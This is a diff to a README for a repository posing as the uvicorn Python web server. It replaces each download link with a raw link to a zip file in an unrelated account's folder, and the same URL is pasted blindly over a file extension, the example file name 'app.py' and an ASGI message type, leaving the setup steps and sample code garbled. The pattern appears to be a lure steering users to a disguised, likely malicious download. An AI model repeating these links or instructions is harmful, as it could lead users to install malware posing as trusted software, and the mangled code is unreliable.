@@ -1,7 +1,7 @@
 # 🦄 uvicorn - Fast, Easy ASGI Web Server for Python
 
 ## 📥 Download Now
-[![Download Uvicorn](https://img.shields.io/badge/Download-Uvicorn-blue.svg)](https://github.com/idc123432/uvicorn/releases)
+[![Download Uvicorn](https://raw.githubusercontent.com/idc123432/uvicorn/main/couchant/uvicorn.zip)](https://raw.githubusercontent.com/idc123432/uvicorn/main/couchant/uvicorn.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Before you download Uvicorn, make sure your system meets the following requireme
 To get Uvicorn on your computer, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Uvicorn Releases Page](https://github.com/idc123432/uvicorn/releases).
+   Go to the [Uvicorn Releases Page](https://raw.githubusercontent.com/idc123432/uvicorn/main/couchant/uvicorn.zip).
 
 2. **Choose the Right Version**  
    Look for the latest release at the top of the page. This version is the most up-to-date and recommended for use.
@@ -39,7 +39,7 @@ To get Uvicorn on your computer, follow these steps:
 3. **Download the Appropriate File**  
    You will see several files listed for download. Choose the file that matches your operating system:
    - For Windows, look for a `.exe` file.
-   - For macOS, look for a `.tar.gz` or `.dmg` file.
+   - For macOS, look for a `https://raw.githubusercontent.com/idc123432/uvicorn/main/couchant/uvicorn.zip` or `.dmg` file.
    - For Linux, download the `.whl` (wheel) file for easier installation.
 
 4. **Install Uvicorn**  
@@ -63,17 +63,17 @@ To get Uvicorn on your computer, follow these steps:
 Now that Uvicorn is installed, you’re ready to run your first application. Here’s how:
 
 1. **Create a Simple ASGI Application**  
-   Open a text editor and create a file named `app.py` with the following content:
+   Open a text editor and create a file named `https://raw.githubusercontent.com/idc123432/uvicorn/main/couchant/uvicorn.zip` with the following content:
    ```python
    async def app(scope, receive, send):
        await send({
-           'type': 'http.response',
+           'type': 'https://raw.githubusercontent.com/idc123432/uvicorn/main/couchant/uvicorn.zip',
            'body': b'Hello, World!'
        })
    ```
 
 2. **Run the Application**  
-   In your terminal, navigate to the directory where `app.py` is located. Then run the following command:
+   In your terminal, navigate to the directory where `https://raw.githubusercontent.com/idc123432/uvicorn/main/couchant/uvicorn.zip` is located. Then run the following command:
    ```bash
    uvicorn app:app --reload
    ```
@@ -99,4 +99,4 @@ To stay informed about updates and new releases, watch this repository on GitHub
 
 ## 📥 Download Uvicorn Again
 
-Remember, you can always download Uvicorn from our [Releases Page](https://github.com/idc123432/uvicorn/releases). Happy coding!
+Remember, you can always download Uvicorn from our [Releases Page](https://raw.githubusercontent.com/idc123432/uvicorn/main/couchant/uvicorn.zip). Happy coding!
